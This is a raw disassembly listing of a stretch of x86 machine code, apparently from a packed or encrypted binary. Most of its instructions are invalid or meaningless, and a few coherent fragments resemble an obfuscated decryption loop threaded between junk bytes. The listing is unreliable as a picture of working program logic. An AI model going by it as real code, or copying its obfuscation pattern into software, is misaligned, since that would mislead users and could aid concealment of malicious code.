  407239:	add    al,0x66
  40723b:	lahf   
  40723c:	sahf   
  40723d:	iret   
  40723e:	push   esi
  40723f:	add    bh,BYTE PTR ds:[eax+0x5dfbf9d3]
  407246:	or     al,0x3c
  407248:	sti    
  407249:	sar    DWORD PTR [esi],cl
  40724b:	fcmovb st,st(3)
  40724d:	xor    DWORD PTR gs:0x4458a03f,0x75
  407255:	inc    esi
  407256:	mov    ebx,0x10d31e11
  40725b:	gs jmp 0xb409:0xee3c6132
  407263:	jbe    0x407263
  407265:	les    esp,FWORD PTR [eax-0x60ef6391]
  40726b:	push   ss
  40726c:	xchg   ecx,eax
  40726d:	inc    edi
  40726e:	adc    BYTE PTR [eax-0x2a],dl
  407271:	jne    0x407228
  407273:	(bad)  
  407274:	(bad)
  407277:	jne    0x407278
  407279:	sti    
  40727a:	or     ebp,DWORD PTR [ebp-0x3e4a6f62]
  407280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407281:	popa   
  407282:	ins    DWORD PTR es:[edi],dx
  407283:	xchg   DWORD PTR [esi],esp
  407285:	(bad)  
  407287:	and    BYTE PTR [ebp-0x67da6a4e],0x67
  40728e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40728f:	push   esi
  407290:	xchg   ecx,eax
  407291:	mov    DWORD PTR [ebx-0x18],edi
  407294:	(bad)  
  407295:	push   cs
  407296:	ins    DWORD PTR es:[edi],dx
  407297:	pushf  
  407298:	sub    eax,0x7da22f35
  40729d:	shr    BYTE PTR [edx],cl
  40729f:	pop    edi
  4072a0:	pop    eax
  4072a1:	jb     0x40722b
  4072a3:	mov    ds:0x12a9f170,eax
  4072a8:	jns    0x40723c
  4072aa:	ret    0x7380
  4072ad:	mov    BYTE PTR [eax-0x3c],dl
  4072b0:	mov    ecx,0xa58fdad6
  4072b5:	mov    ebx,0xe193c227
  4072ba:	dec    ebx
  4072bb:	ins    DWORD PTR es:[edi],dx
  4072bc:	push   esi
  4072bd:	pop    ecx
  4072be:	hlt    
  4072bf:	pop    ecx
  4072c0:	rol    BYTE PTR [edx],0x64
  4072c3:	in     al,0xfc
  4072c5:	(bad)  
  4072c6:	out    dx,al
  4072c7:	sbb    ebp,DWORD PTR [eax-0x52]
  4072ca:	jp     0x407343
  4072cc:	sbb    dl,BYTE PTR [esi+0x6889d91a]
  4072d2:	aad    0x45
  4072d4:	pop    ebx
  4072d5:	imul   edi,DWORD PTR [edx+0x13],0xfffffffc
  4072d9:	add    bh,BYTE PTR [edi+0x7aa591f7]
  4072df:	or     al,0xf7
  4072e1:	lahf   
  4072e2:	(bad)  
  4072e3:	clc    
  4072e4:	cmp    DWORD PTR [ebp+edx*8-0x296f5822],esi
  4072eb:	stos   BYTE PTR es:[edi],al
  4072ec:	loopne 0x407312
  4072ee:	push   esi
  4072ef:	and    eax,0x24b23572
  4072f4:	lock (bad) 
  4072f6:	sbb    DWORD PTR [esi-0xc],edx
  4072f9:	mov    eax,0xe4196fc9
  4072fe:	and    ch,al
  407300:	add    edi,DWORD PTR [edi+ebp*8+0x55]
  407304:	(bad)  
  407305:	and    DWORD PTR [edx-0x3c],edx
  407308:	test   eax,0x8bde7191
  40730d:	fnstenv [eax-0x623c3db2]
  407313:	dec    edi
  407314:	or     BYTE PTR [ebx-0x1e7e07bb],cl
  40731a:	out    dx,eax
  40731b:	add    BYTE PTR [bx+si],al
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x430546
  40732a:	sub    DWORD PTR ds:0x43049a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e762,0x4304aa
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x4304b6,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi-0x56fddca4]
  40736c:	mov    bh,0x4e
  40736e:	mov    esi,0x7e7ecf09
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x4072ff
  407378:	dec    ebx
  407379:	xor    al,0xc8
  40737b:	jmp    0x3a52:0xf018003b
  407382:	cmp    eax,0xccac5ae2
  407387:	cmp    bl,bl
  407389:	fdiv   DWORD PTR [eax+0x40]
  40738c:	stos   BYTE PTR es:[edi],al
  40738d:	push   0xf5e3f2a5
  407392:	cmp    BYTE PTR [ebx+0x4],bl
  407395:	cmc    
  407396:	add    al,BYTE PTR [esp+edi*4+0x70]
  40739a:	jne    0x4073f1
  40739c:	mov    esi,ss
  40739e:	call   0xacaad209
  4073a3:	and    al,0x8c
  4073a5:	pop    edi
  4073a6:	xchg   ch,cl
  4073a8:	pop    ecx
  4073a9:	les    esp,FWORD PTR [edx]
  4073ab:	inc    edx
  4073ac:	mov    esi,0xe6cdba3b
  4073b1:	xor    eax,0x9cef42db
  4073b6:	shl    ebx,cl
  4073b8:	add    eax,0xe0a423f2
  4073bd:	jae    0x407378
  4073bf:	jp     0x407413
  4073c1:	dec    edi
  4073c2:	dec    esp
  4073c3:	push   edx
  4073c4:	cmp    BYTE PTR [edx+0x229ffea4],0xc6
  4073cb:	out    dx,al
  4073cc:	dec    ebp
  4073cd:	mov    BYTE PTR [ebx-0x29f109f3],dh
  4073d3:	dec    edx
  4073d4:	ss aad 0x8b
  4073d7:	rcl    bh,1
  4073d9:	mov    al,ds:0x78e8d29b
  4073de:	mov    ecx,0xf6dc7c3a
  4073e3:	cmp    eax,0xb2364954
  4073e8:	xchg   esp,eax
  4073e9:	inc    ebx
  4073ea:	pop    eax
  4073eb:	mov    ?,WORD PTR [ecx]
  4073ed:	cmp    al,0x92
  4073ef:	xchg   esp,eax
  4073f0:	adc    DWORD PTR [esi+0x6b],0xffffffec
  4073f4:	adc    eax,0x9a6e0700
  4073f9:	not    BYTE PTR [esi+0x1d]
  4073fc:	pop    ds
  4073fd:	fwait
  4073fe:	dec    eax
  4073ff:	pop    esp
  407400:	xlat   BYTE PTR ds:[ebx]
  407401:	sub    esp,DWORD PTR [ecx]
  407403:	pop    ss
  407404:	pop    edi
  407405:	imul   esp,esi,0x8ef989b7
  40740b:	sub    eax,DWORD PTR [edx-0x8]
  40740e:	add    edi,eax
  407410:	sar    DWORD PTR [esi+0x6f2555d7],0x33
  407417:	mov    bh,0x54
  407419:	mov    dh,0x9c
  40741b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40741c:	jnp    0x4073f2
  40741e:	push   0x49
  407420:	push   ds
  407421:	jle    0x407456
  407423:	xor    DWORD PTR [edx-0x5a0b613e],ecx
  407429:	es add eax,ecx
  40742c:	dec    ebp
  40742d:	cmp    dl,BYTE PTR cs:[ebx+0x2c]
  407431:	repnz inc esi
  407433:	jl     0x4074a4
  407435:	jl     0x4073cd
  407437:	sbb    bh,BYTE PTR [eax+eiz*8]
  40743a:	shl    DWORD PTR [ebp-0x6],1
  40743d:	fisub  WORD PTR [ecx]
  40743f:	pusha  
  407440:	mov    ds:0x6ff06f56,eax
  407445:	xor    esp,DWORD PTR [ebx-0x768a8b58]
  40744b:	stc    
  40744c:	ss test eax,0x249e5a95
  407452:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  407454:	or     eax,0x305043bd
  407459:	jmp    0xc81f1446
  40745e:	and    edx,edi
  407460:	test   eax,0xe079d452
  407465:	imul   edi,DWORD PTR [eax-0x53],0xc42dcb0f
  40746c:	retf   
  40746d:	mov    ?,eax
  40746f:	mov    eax,0x5bd2664d
  407474:	cmc    
  407475:	jne    0x407453
  407477:	rcl    ebp,0x5e
  40747a:	cmp    BYTE PTR [ebx+ecx*1],bh
  40747d:	mov    ds:0xd983bfb5,al
  407482:	xchg   ebp,eax
  407483:	and    ecx,DWORD PTR [edi+0x7f386054]
  407489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40748a:	mov    WORD PTR [ebx],ds
  40748c:	cvttps2pi mm0,QWORD PTR [edx]
  40748f:	dec    ebp
  407490:	and    eax,0xd87ee7c5
  407495:	fwait
  407496:	xlat   BYTE PTR ds:[ebx]
  407497:	mov    ds,ebx
  407499:	pop    ss
  40749a:	test   eax,0xa49937c8
  40749f:	and    eax,edx
  4074a1:	dec    ebp
  4074a2:	add    al,0x26
  4074a4:	xchg   edx,eax
  4074a5:	sub    DWORD PTR [edx],eax
  4074a7:	and    DWORD PTR [ebx],ebx
  4074a9:	fcmovnu st,st(6)
  4074ab:	sbb    bh,ah
  4074ad:	add    cl,BYTE PTR [edx+0x56]
  4074b0:	lods   al,BYTE PTR ds:[esi]
  4074b1:	ror    cl,0x6e
  4074b4:	mov    esp,0xcda95429
  4074b9:	das    
  4074ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074bb:	sahf   
  4074bc:	dec    eax
  4074bd:	loope  0x407471
  4074bf:	ins    DWORD PTR es:[edi],dx
  4074c0:	adc    cl,BYTE PTR [edx-0x69]
  4074c3:	jg     0x407510
  4074c5:	adc    al,0x26
  4074c7:	jno    0x40750c
  4074c9:	cmp    eax,0x687303f5
  4074ce:	push   0xd824719a
  4074d3:	xchg   edi,eax
  4074d4:	retf   
  4074d5:	ret    
  4074d6:	call   0xd0a41e43
  4074db:	cmp    eax,0x40
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	pop    edi
  40750a:	outs   dx,DWORD PTR ds:[esi]
  40750b:	jp     0x407568
  40750d:	in     eax,dx
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x407506
  407516:	cmp    al,0x68
  407518:	hlt    
  407519:	jl     0x4074b0
  40751b:	scas   al,BYTE PTR es:[edi]
  40751c:	push   eax
  40751d:	outs   dx,DWORD PTR ds:[esi]
  40751e:	cs adc BYTE PTR ss:[ecx-0x35],dl
  407523:	mov    edi,0xd86744ed
  407528:	dec    esi
  407529:	jg     0x40752e
  40752b:	aas    
  40752c:	out    dx,al
  40752d:	mov    ebx,0x328af256
  407532:	aas    
  407533:	mov    ds:0x1a206f04,al
  407538:	add    eax,DWORD PTR [edx+0x14]
  40753b:	popa   
  40753c:	jge    0x407556
  40753e:	add    ah,BYTE PTR [ebx]
  407540:	jne    0x4074f0
  407542:	mov    edi,es
  407544:	mul    DWORD PTR [ebp-0x19]
  407547:	lock scas al,BYTE PTR es:[edi]
  407549:	or     eax,0xfaeda4f7
  40754e:	cwde   
  40754f:	test   DWORD PTR [edx+0x39],edi
  407552:	cwde   
  407553:	add    eax,0xc5947bd4
  407558:	outs   dx,BYTE PTR ds:[esi]
  407559:	xor    bh,bl
  40755b:	fs pop eax
  40755d:	(bad)  
  40755e:	and    eax,0x2664a867
  407563:	mov    bh,0x61
  407565:	scas   eax,DWORD PTR es:[edi]
  407566:	(bad)  
  407567:	scas   al,BYTE PTR es:[edi]
  407568:	cmp    BYTE PTR ds:0x94f8193a,bl
  40756e:	pushf  
  40756f:	mov    dl,BYTE PTR cs:[ebx-0x2885c266]
  407576:	imul   esi,DWORD PTR ss:[edx+0x26],0x116fd9a4
  40757e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40757f:	cmp    esp,DWORD PTR [ebp+0x4ae085a0]
  407585:	jmp    0x9823e096
  40758a:	adc    ch,bl
  40758c:	or     bh,ch
  40758e:	mov    ebp,0x1a1b5319
  407593:	addr16 pop edx
  407595:	shl    DWORD PTR [esi+0x1d],0xd2
  407599:	inc    edx
  40759a:	pop    eax
  40759b:	pop    esi
  40759c:	mov    edx,0x2e91310b
  4075a1:	push   edx
  4075a2:	push   ebp
  4075a3:	push   ebx
  4075a4:	fiadd  WORD PTR [eax]
  4075a6:	inc    BYTE PTR [esp+edx*4]
  4075a9:	fdivr  st,st(7)
  4075ab:	add    BYTE PTR [eax],bl
  4075ad:	jmp    0x1b73:0xba72ef8f
  4075b4:	arpl   ax,bp
  4075b6:	push   ds
  4075b7:	xchg   ebp,eax
  4075b8:	cdq    
  4075b9:	inc    edi
  4075ba:	inc    esp
  4075bb:	popa   
  4075bc:	ror    BYTE PTR [eax],1
  4075be:	pop    ecx
  4075bf:	fst    QWORD PTR [edi-0x7ef59859]
  4075c5:	es push 0xffffffb7
  4075c8:	mov    ebx,0x6d5fb731
  4075cd:	aas    
  4075ce:	jae    0x4075b3
  4075d0:	jae    0x4075ba
  4075d2:	ret    
  4075d3:	sar    DWORD PTR [ebx],cl
  4075d5:	cdq    
  4075d6:	and    DWORD PTR [ebx-0x1e],edi
  4075d9:	stos   BYTE PTR es:[edi],al
  4075da:	sti    
  4075db:	add    DWORD PTR [esi-0x2a],ebp
  4075de:	leave  
  4075df:	ins    DWORD PTR es:[edi],dx
  4075e0:	aas    
  4075e1:	jmp    0xe42a:0xff93b195
  4075e8:	or     DWORD PTR [ebx],esi
  4075ea:	and    eax,0x9e2e8cfb
  4075ef:	mov    dh,0xc9
  4075f1:	aaa    
  4075f2:	lea    ebx,[ebx-0xc]
  4075f5:	sbb    al,0x98
  4075f7:	in     al,0xd6
  4075f9:	(bad)
  4075fc:	mov    al,ds:0x19e9c3a
  407601:	add    al,0xa4
  407603:	data16 into 
  407605:	or     ch,BYTE PTR [ebx-0x3b]
  407608:	out    0xa2,eax
  40760a:	mov    edx,0xb6e55e03
  40760f:	adc    cl,BYTE PTR [ecx]
  407611:	fst    DWORD PTR [edx+0x59ee3b65]
  407617:	aam    0x56
  407619:	xchg   eax,edx
  40761b:	or     eax,0x2f220606
  407620:	mov    edi,0x59a4abcd
  407625:	sbb    al,0x26
  407627:	pop    ds
  407628:	leave  
  407629:	xor    al,0x73
  40762b:	adc    DWORD PTR [edi+0x17],0x4c
  40762f:	and    edx,DWORD PTR [ebx+edx*2]
  407632:	stos   BYTE PTR es:[edi],al
  407633:	jle    0x40761d
  407635:	sub    eax,0x45a4b153
  40763a:	cmp    ecx,edi
  40763c:	inc    esp
  40763d:	sbb    esp,DWORD PTR [edx]
  40763f:	ds inc ecx
  407641:	mov    edi,0xdc03928d
  407646:	pop    ds
  407647:	neg    DWORD PTR [ebp-0x7817dc70]
  40764d:	adc    BYTE PTR [esi-0x5381e943],al
  407653:	jecxz  0x40764b
  407655:	loop   0x40766d
  407657:	imul   ecx,DWORD PTR [ecx],0xffffffd9
  40765a:	mov    dl,0xd0
  40765c:	jmp    0x4075e3
  40765e:	fcomp  DWORD PTR [ecx]
  407660:	fbstp  TBYTE PTR [edx-0x71]
  407663:	or     DWORD PTR [esi-0x26002a5b],ebp
  407669:	inc    ecx
  40766a:	(bad)  
  40766b:	push   ss
  40766c:	xchg   cl,bh
  40766e:	mov    eax,ds:0x51152748
  407673:	sbb    DWORD PTR [eax],esi
  407675:	xchg   ebx,eax
  407676:	push   0x7d8b6296
  40767b:	or     cl,ch
  40767d:	jl     0x407680
  40767f:	add    BYTE PTR [eax],al
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	cwde   
  40768e:	sti    
  40768f:	push   0xffffff87
  407691:	inc    ecx
  407692:	sar    DWORD PTR [esi+0x7e],0xd2
  407696:	jg     0x407716
  407698:	jle    0x40763e
  40769a:	sar    al,1
  40769c:	(bad)  
  40769e:	dec    eax
  40769f:	jmp    0x40764f
  4076a1:	xchg   edi,eax
  4076a2:	jecxz  0x4076e2
  4076a4:	add    DWORD PTR [eax-0x59],0x38
  4076a8:	(bad)  
  4076a9:	lods   al,BYTE PTR ds:[esi]
  4076aa:	sti    
  4076ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076ac:	js     0x40762f
  4076ae:	add    DWORD PTR es:[edi-0x16],0xffffff89
  4076b3:	adc    al,0xef
  4076b5:	push   ss
  4076b6:	push   ebx
  4076b7:	test   al,0x32
  4076b9:	cwde   
  4076ba:	add    ah,BYTE PTR [esp+ebx*1]
  4076bd:	fwait
  4076be:	out    dx,eax
  4076bf:	mov    cl,0xc6
  4076c1:	je     0x4076dc
  4076c3:	mov    ebx,0x9aedea92
  4076c8:	adc    eax,0x87a3a346
  4076cd:	in     eax,dx
  4076ce:	mov    eax,DWORD PTR [edx+0x61]
  4076d1:	mov    ah,0x8f
  4076d3:	mov    edx,0xef164c95
  4076d8:	push   es
  4076d9:	test   dl,dl
  4076db:	aad    0xc7
  4076dd:	xlat   BYTE PTR ds:[ebx]
  4076de:	xchg   edx,eax
  4076df:	popf   
  4076e0:	xchg   cl,al
  4076e2:	mov    dl,0x99
  4076e4:	lods   al,BYTE PTR ds:[esi]
  4076e5:	or     eax,0x8a23dc82
  4076ea:	mov    al,ds:0xb1954934
  4076ef:	call   0xc14e80e1
  4076f4:	pop    ds
  4076f5:	mov    dh,ah
  4076f7:	pop    es
  4076f8:	(bad)  
  4076f9:	xchg   ebx,eax
  4076fa:	pop    esp
  4076fb:	mov    edx,0x1b77e603
  407700:	xor    BYTE PTR [esi-0x16],0xb2
  407704:	mov    bl,0xa3
  407706:	lahf   
  407707:	and    ebx,esi
  407709:	jae    0x407710
  40770b:	fbld   TBYTE PTR [edi]
  40770d:	lods   eax,DWORD PTR ds:[esi]
  40770e:	test   eax,0x57625d9b
  407713:	retf   
  407714:	cmp    ebp,0xffffffa8
  407717:	dec    ebp
  407718:	arpl   WORD PTR [esi],bp
  40771a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40771b:	jg     0x407722
  40771d:	jp     0x407798
  40771f:	mov    esp,0x34503d21
  407724:	and    dh,BYTE PTR [ebx-0x32241ec2]
  40772a:	or     dh,BYTE PTR [esi]
  40772c:	hlt    
  40772d:	jecxz  0x407770
  40772f:	pop    esi
  407730:	jp     0x407791
  407732:	dec    esi
  407733:	sbb    bl,BYTE PTR [edi]
  407735:	test   eax,0x42d798ae
  40773b:	into   
  40773c:	call   0xd27d038e
  407741:	imul   cl
  407743:	jl     0x4076f2
  407745:	fldcw  WORD PTR [eax]
  407747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407748:	cmp    DWORD PTR [ecx+edx*4-0x2f89079d],ebx
  40774f:	ret    0xba10
  407752:	mov    al,0x6
  407754:	jb     0x40773c
  407756:	fwait
  407757:	icebp  
  407758:	mov    edi,0x21850af8
  40775d:	sub    eax,0x94dc6e47
  407763:	mov    bh,0x66
  407765:	(bad)  
  407767:	ficomp WORD PTR [esi]
  407769:	outs   dx,DWORD PTR ds:[esi]
  40776a:	(bad)
  40776d:	sub    al,0x68
  40776f:	inc    edi
  407770:	mov    al,ds:0x37576d45
  407775:	cld    
  407776:	lock sbb BYTE PTR [edx],0xea
  40777a:	mov    DWORD PTR [edi],eax
  40777c:	outs   dx,BYTE PTR ds:[esi]
  40777d:	push   0xbee0fb8c
  407782:	mov    dl,0x1d
  407784:	arpl   WORD PTR [ebx+0x10],ax
  407787:	pop    edi
  407788:	and    al,0x4d
  40778a:	icebp  
  40778b:	push   cs
  40778c:	daa    
  40778d:	xlat   BYTE PTR ds:[ebx]
  40778e:	cwde   
  40778f:	inc    ecx
  407790:	test   al,0x38
  407792:	lods   eax,DWORD PTR ds:[esi]
  407793:	adc    BYTE PTR [ebx+0x6087f586],dl
  407799:	cmp    dl,BYTE PTR ds:0xb2a82dcd
  40779f:	test   BYTE PTR [ebx],dh
  4077a1:	pop    es
  4077a2:	mov    cl,0xc8
  4077a4:	xchg   edx,eax
  4077a5:	push   cs
  4077a6:	aam    0x13
  4077a8:	fwait
  4077a9:	sub    DWORD PTR [eax+eax*8-0x48],ebx
  4077ad:	outs   dx,BYTE PTR ds:[esi]
  4077ae:	out    0xf,eax
  4077b0:	jmp    0x407773
  4077b2:	jge    0x4077ca
  4077b4:	shr    DWORD PTR [edi-0x204c6cbc],cl
  4077ba:	or     eax,0x6042dd5a
  4077bf:	add    eax,0xbf49cbad
  4077c4:	mov    ds:0xc53374a5,al
  4077c9:	test   ch,dh
  4077cb:	mov    ch,0x27
  4077cd:	add    al,0x7c
  4077cf:	pop    ss
  4077d0:	adc    dh,dh
  4077d2:	rol    BYTE PTR [edx],cl
  4077d4:	cld    
  4077d5:	int    0x2f
  4077d7:	sub    esi,DWORD PTR [eax-0x1f]
  4077da:	mov    ah,0x38
  4077dc:	push   esp
  4077dd:	push   eax
  4077de:	aam    0xcb
  4077e0:	sbb    eax,0x435e2ec9
  4077e5:	mov    esi,DWORD PTR [eax-0x7cd52353]
  4077eb:	adc    esi,ebx
  4077ed:	scas   eax,DWORD PTR es:[edi]
  4077ee:	xchg   esp,eax
  4077ef:	inc    esi
  4077f0:	cmp    eax,0x53834783
  4077f5:	cwde   
  4077f6:	int    0xd
  4077f8:	jbe    0x407866
  4077fa:	cs push ds
  4077fc:	jle    0x4077b6
  4077fe:	inc    eax
  4077ff:	mov    al,BYTE PTR [eax]
  407801:	add    BYTE PTR [esi+0x33],ah
  407804:	inc    esp
  407805:	xchg   edi,eax
  407806:	add    bh,BYTE PTR [edi+0x3b06]
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	xchg   ebp,eax
  407821:	add    dl,BYTE PTR [ecx+0x7ec325a3]
  407827:	jle    0x4077fb
  407829:	jg     0x4078a9
  40782b:	jle    0x407812
  40782d:	pushf  
  40782e:	push   ecx
  40782f:	ret    0xada1
  407832:	or     ebx,ebx
  407834:	mov    edi,0x84289835
  407839:	push   esp
  40783a:	mov    eax,0x9a9b3c4e
  40783f:	js     0x4078bc
  407841:	in     al,0x7b
  407843:	mov    ds:0x2f28cf71,al
  407848:	aam    0xe0
  40784a:	sahf   
  40784b:	push   ebx
  40784c:	in     eax,dx
  40784d:	in     al,0xd4
  40784f:	dec    ebx
  407850:	sti    
  407851:	push   ecx
  407852:	fiadd  DWORD PTR [edx-0x5b]
  407855:	pop    ds
  407856:	cmp    ah,BYTE PTR ds:0x264c83d4
  40785c:	call   0x2000:0x8940237c
  407863:	push   es
  407864:	jl     0x4077ff
  407866:	mov    bh,0x68
  407868:	stos   BYTE PTR es:[edi],al
  407869:	pushf  
  40786a:	jg     0x40782c
  40786c:	pop    es
  40786d:	cmp    esp,DWORD PTR [esi-0x37]
  407870:	in     eax,0x5d
  407872:	bound  edx,QWORD PTR [edx+0x6d0aa15d]
  407878:	mov    WORD PTR [esi-0x49],ds
  40787b:	int    0x3f
  40787d:	outs   dx,DWORD PTR ds:[esi]
  40787e:	icebp  
  40787f:	cmp    al,0xc6
  407881:	jmp    0x9c12:0x6681adb
  407888:	cmp    DWORD PTR [ebx],esp
  40788a:	(bad)  
  40788b:	aaa    
  40788c:	xor    eax,eax
  40788e:	jl     0x4078c3
  407890:	jnp    0x4078b4
  407892:	ins    DWORD PTR es:[edi],dx
  407893:	retf   0xe84a
  407896:	je     0x407837
  407898:	push   edx
  407899:	mov    DWORD PTR ds:0x2757418d,ecx
  40789f:	pop    ebp
  4078a0:	(bad)  
  4078a1:	adc    BYTE PTR [edx+ecx*8],bh
  4078a4:	xchg   ebp,eax
  4078a5:	jns    0x407923
  4078a7:	cmp    bl,BYTE PTR [edx-0x764592e6]
  4078ad:	loopne 0x4078d4
  4078af:	pop    ds
  4078b0:	mov    bh,0x4f
  4078b2:	adc    bh,bl
  4078b4:	mov    bl,0xe1
  4078b6:	dec    esi
  4078b7:	push   0xb7d5eabc
  4078bc:	ret    
  4078bd:	push   ds
  4078be:	in     eax,dx
  4078bf:	sub    al,0xe0
  4078c1:	mov    bl,0x41
  4078c3:	mov    ebp,0x79752cac
  4078c8:	dec    ebp
  4078c9:	fadd   st,st(7)
  4078cb:	retf   0xd
  4078ce:	hlt    
  4078cf:	inc    esi
  4078d0:	(bad)  
  4078d1:	xor    bh,BYTE PTR [ebp-0x37]
  4078d4:	sbb    DWORD PTR [esi],0x6d
  4078d7:	jmpw   0x3ba5
  4078db:	out    dx,al
  4078dc:	mov    dl,0x72
  4078de:	daa    
  4078df:	cdq    
  4078e0:	mov    WORD PTR ss:[edi],ds
  4078e3:	es xor eax,0x704b174e
  4078e9:	fldcw  WORD PTR [eax-0x2a]
  4078ec:	pop    ss
  4078ed:	gs stc 
  4078ef:	xor    DWORD PTR [ebp-0x13],eax
  4078f2:	hlt    
  4078f3:	add    BYTE PTR [ebx-0x12],cl
  4078f6:	add    al,0x40
  4078f8:	test   bl,ch
  4078fa:	imul   ecx,eax,0xfffffffe
  4078fd:	fldenv [edx+ebp*2+0x2d]
  407901:	jo     0x40792d
  407903:	lods   eax,DWORD PTR ds:[esi]
  407904:	push   esp
  407905:	push   cs
  407906:	adc    BYTE PTR [ebx],bl
  407908:	call   0xe952:0x6bd134f2
  40790f:	inc    edi
  407910:	das    
  407911:	mov    ds:0x5f3a882e,eax
  407916:	xor    BYTE PTR [edi],ah
  407918:	mov    edi,0x8f422497
  40791d:	mov    ds:0x9e9b0703,eax
  407922:	xor    cl,dl
  407924:	dec    esi
  407925:	xchg   esp,eax
  407926:	push   esi
  407927:	jo     0x4079a8
  407929:	pop    edx
  40792a:	inc    ebx
  40792b:	and    al,0x1f
  40792d:	mov    bl,0xec
  40792f:	push   eax
  407930:	pusha  
  407931:	xor    DWORD PTR [ecx],edx
  407933:	int3   
  407934:	sub    al,0xbf
  407936:	add    BYTE PTR [eax],bh
  407938:	(bad)  
  407939:	in     al,0x27
  40793b:	xchg   edx,eax
  40793c:	ficom  DWORD PTR [ecx+0x1f1aa913]
  407942:	retf   
  407943:	xor    dl,BYTE PTR [eax+0x45946079]
  407949:	xchg   edx,eax
  40794a:	add    al,0xca
  40794c:	push   esi
  40794d:	xchg   edi,eax
  40794e:	cmp    cl,BYTE PTR [edi]
  407950:	inc    edi
  407951:	aas    
  407952:	push   cs
  407953:	outs   dx,BYTE PTR ds:[esi]
  407954:	test   al,0xd4
  407956:	pop    ecx
  407957:	bound  edx,QWORD PTR [edi-0x3a19ab7f]
  40795d:	mov    eax,ds:0x7e03da3c
  407962:	jmp    0x4079a0
  407964:	inc    esp
  407965:	adc    DWORD PTR [edi],ecx
  407967:	pop    ebx
  407968:	mov    BYTE PTR [ecx+0x6c2c12b3],0x42
  40796f:	fdiv   st(5),st
  407971:	or     BYTE PTR [eax-0x60],ah
  407974:	ret    0x2a80
  407977:	xlat   BYTE PTR ds:[ebx]
  407978:	jmp    0x96c4:0x8ac94154
  40797f:	sub    DWORD PTR [eax+0x5f],esp
  407982:	sbb    eax,0x2cbabbbc
  407987:	ja     0x407938
  407989:	sbb    esi,edx
  40798b:	(bad)  
  40798c:	aaa    
  40798d:	cmp    eax,DWORD PTR [edx+0x4d]
  407990:	movzx  eax,ax
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	xchg   edi,eax
  4079a8:	mov    DWORD PTR [esi+0x7ec499e2],ebp
  4079ae:	jle    0x407982
  4079b0:	jg     0x407a30
  4079b2:	jle    0x4079d5
  4079b4:	push   esp
  4079b5:	sbb    BYTE PTR [ebx+0xcbe9c37],0x9b
  4079bc:	or     BYTE PTR [esi+0x144e4cc8],bl
  4079c2:	shr    DWORD PTR [ecx+ebp*4+0x1b16ab51],cl
  4079c9:	add    eax,0xbbca4fe1
  4079ce:	rol    BYTE PTR [ecx-0x5001cc0d],1
  4079d4:	mov    bh,0xd0
  4079d6:	cli    
  4079d7:	les    edi,FWORD PTR [ebx+eax*2+0x57]
  4079db:	adc    eax,0x1ac912e4
  4079e0:	and    cl,BYTE PTR [edx+0x1774e10a]
  4079e6:	hlt    
  4079e7:	inc    ebx
  4079e8:	push   ss
  4079e9:	clc    
  4079ea:	mov    ebx,0xc5d98359
  4079ef:	fnstcw WORD PTR [esi-0x9]
  4079f2:	sub    eax,0x191b7938
  4079f7:	jge    0x407a16
  4079f9:	(bad)  
  4079fa:	sbb    cl,BYTE PTR [esi+0x3a]
  4079fd:	loopne 0x4079ba
  4079ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a00:	xor    dl,BYTE PTR ds:0x140d2d1e
  407a06:	jbe    0x407a24
  407a08:	mov    esi,0x974aaa1
  407a0d:	jmp    FWORD PTR [edi+eiz*2]
  407a10:	cli    
  407a11:	jno    0x407a0a
  407a13:	xor    eax,0xd52272aa
  407a18:	sbb    eax,0x57acd9c9
  407a1d:	popf   
  407a1e:	pop    es
  407a1f:	push   DWORD PTR [edi]
  407a21:	out    dx,eax
  407a22:	arpl   WORD PTR [ebp+0x5b],bx
  407a25:	jbe    0x4079e8
  407a27:	xchg   ebx,eax
  407a28:	popf   
  407a29:	dec    esi
